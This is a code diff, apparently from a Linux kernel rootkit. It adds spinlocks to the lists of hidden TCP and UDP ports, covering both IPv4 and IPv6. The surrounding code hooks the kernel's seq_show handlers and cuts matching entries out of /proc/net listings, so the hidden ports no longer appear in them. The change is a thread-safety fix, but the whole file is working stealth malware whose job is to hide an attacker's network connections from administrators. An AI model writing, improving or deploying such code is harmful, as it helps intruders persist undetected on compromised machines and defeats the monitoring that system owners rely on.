@@ -19,6 +19,11 @@ LIST_HEAD(hidden_tcp6_ports);
 LIST_HEAD(hidden_udp4_ports);
 LIST_HEAD(hidden_udp6_ports);
 
+static DEFINE_SPINLOCK(hidden_tcp4_lock);
+static DEFINE_SPINLOCK(hidden_tcp6_lock);
+static DEFINE_SPINLOCK(hidden_udp4_lock);
+static DEFINE_SPINLOCK(hidden_udp6_lock);
+
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
@@ -65,22 +70,27 @@ void hide_tcp4_port ( unsigned short port )
         return;
     hp->port = port;
 
+    spin_lock(&hidden_tcp4_lock);
     list_add(&hp->list, &hidden_tcp4_ports);
+    spin_unlock(&hidden_tcp4_lock);
 }
 
 void unhide_tcp4_port ( unsigned short port )
 {
     struct hidden_port *hp;
 
+    spin_lock(&hidden_tcp4_lock);
     list_for_each_entry ( hp, &hidden_tcp4_ports, list )
     {
         if ( port == hp->port )
         {
             list_del(&hp->list);
             kfree(hp);
-            break;
+            spin_unlock(&hidden_tcp4_lock);
+            return;
         }
     }
+    spin_unlock(&hidden_tcp4_lock);
 }
 
 void hide_tcp6_port ( unsigned short port )
@@ -91,22 +101,28 @@ void hide_tcp6_port ( unsigned short port )
     if ( ! hp )
         return;
     hp->port = port;
+
+    spin_lock(&hidden_tcp6_lock);
     list_add(&hp->list, &hidden_tcp6_ports);
+    spin_unlock(&hidden_tcp6_lock);
 }
 
 void unhide_tcp6_port ( unsigned short port )
 {
     struct hidden_port *hp;
 
+    spin_lock(&hidden_tcp6_lock);
     list_for_each_entry ( hp, &hidden_tcp6_ports, list )
     {
         if ( port == hp->port )
         {
             list_del(&hp->list);
             kfree(hp);
-            break;
+            spin_unlock(&hidden_tcp6_lock);
+            return;
         }
     }
+    spin_unlock(&hidden_tcp6_lock);
 }
 
 void hide_udp4_port ( unsigned short port )
@@ -117,22 +133,28 @@ void hide_udp4_port ( unsigned short port )
     if ( ! hp )
         return;
     hp->port = port;
+
+    spin_lock(&hidden_udp4_lock);
     list_add(&hp->list, &hidden_udp4_ports);
+    spin_unlock(&hidden_udp4_lock);
 }
 
 void unhide_udp4_port ( unsigned short port )
 {
     struct hidden_port *hp;
 
+    spin_lock(&hidden_udp4_lock);
     list_for_each_entry ( hp, &hidden_udp4_ports, list )
     {
         if ( port == hp->port )
         {
             list_del(&hp->list);
             kfree(hp);
-            break;
+            spin_unlock(&hidden_udp4_lock);
+            return;
         }
     }
+    spin_unlock(&hidden_udp4_lock);
 }
 
 void hide_udp6_port ( unsigned short port )
@@ -143,22 +165,28 @@ void hide_udp6_port ( unsigned short port )
     if ( ! hp )
         return;
     hp->port = port;
+
+    spin_lock(&hidden_udp6_lock);
     list_add(&hp->list, &hidden_udp6_ports);
+    spin_unlock(&hidden_udp6_lock);
 }
 
 void unhide_udp6_port ( unsigned short port )
 {
     struct hidden_port *hp;
 
+    spin_lock(&hidden_udp6_lock);
     list_for_each_entry ( hp, &hidden_udp6_ports, list )
     {
         if ( port == hp->port )
         {
             list_del(&hp->list);
             kfree(hp);
-            break;
+            spin_unlock(&hidden_udp6_lock);
+            return;
         }
     }
+    spin_unlock(&hidden_udp6_lock);
 }
 
 static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
@@ -174,15 +202,18 @@ static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
     if (seq->count < TMPSZ)
         return ret;
 
+    spin_lock(&hidden_tcp4_lock);
     list_for_each_entry ( hp, &hidden_tcp4_ports, list )
     {
         sprintf(port, ":%04X", hp->port);
         if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
         {
             seq->count -= TMPSZ;
-            break;
+            spin_unlock(&hidden_tcp4_lock);
+            return ret;
         }
     }
+    spin_unlock(&hidden_tcp4_lock);
 
     return ret;
 }
@@ -200,15 +231,18 @@ static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
     if (seq->count < TMPSZ)
         return ret;
 
+    spin_lock(&hidden_tcp6_lock);
     list_for_each_entry ( hp, &hidden_tcp6_ports, list )
     {
         sprintf(port, ":%04X", hp->port);
         if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
         {
             seq->count -= TMPSZ;
-            break;
+            spin_unlock(&hidden_tcp6_lock);
+            return ret;
         }
     }
+    spin_unlock(&hidden_tcp6_lock);
 
     return ret;
 }
@@ -226,15 +260,18 @@ static int n_udp4_seq_show ( struct seq_file *seq, void *v )
     if (seq->count < TMPSZ)
         return ret;
 
+    spin_lock(&hidden_udp4_lock);
     list_for_each_entry ( hp, &hidden_udp4_ports, list )
     {
         sprintf(port, ":%04X", hp->port);
         if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
         {
             seq->count -= TMPSZ;
-            break;
+            spin_unlock(&hidden_udp4_lock);
+            return ret;
         }
     }
+    spin_unlock(&hidden_udp4_lock);
 
     return ret;
 }
@@ -252,15 +289,18 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
     if (seq->count < TMPSZ)
         return ret;
 
+    spin_lock(&hidden_udp6_lock);
     list_for_each_entry ( hp, &hidden_udp6_ports, list )
     {
         sprintf(port, ":%04X", hp->port);
         if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
         {
             seq->count -= TMPSZ;
-            break;
+            spin_unlock(&hidden_udp6_lock);
+            return ret;
         }
     }
+    spin_unlock(&hidden_udp6_lock);
 
     return ret;
 }
